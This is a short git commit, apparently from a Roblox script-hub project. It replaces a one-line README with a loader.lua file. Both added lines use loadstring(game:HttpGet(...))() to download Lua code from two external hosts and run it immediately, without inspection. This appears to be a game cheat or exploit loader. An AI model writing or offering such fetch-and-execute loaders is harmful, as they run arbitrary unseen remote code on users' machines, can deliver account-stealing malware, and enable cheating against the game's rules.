39ff912096a30e09661debb195b4401c4acd7f8b
KittyScriptsS2 <kittyscripts95@gmail.com>
2026-03-27 22:27:37 -0400

    Update and rename README.md to loader.lua

--- README.md
+++
@@ -1,1 +0,0 @@
-# OverDriveH-Kitty
---
+++ loader.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNjZTMwOWU2LWU2OTctNGQwNC04ZTk2LWYwYTk4MWE5ZTgxMSIsImtpbmQiOiJsb2FkZXIifQ"))()
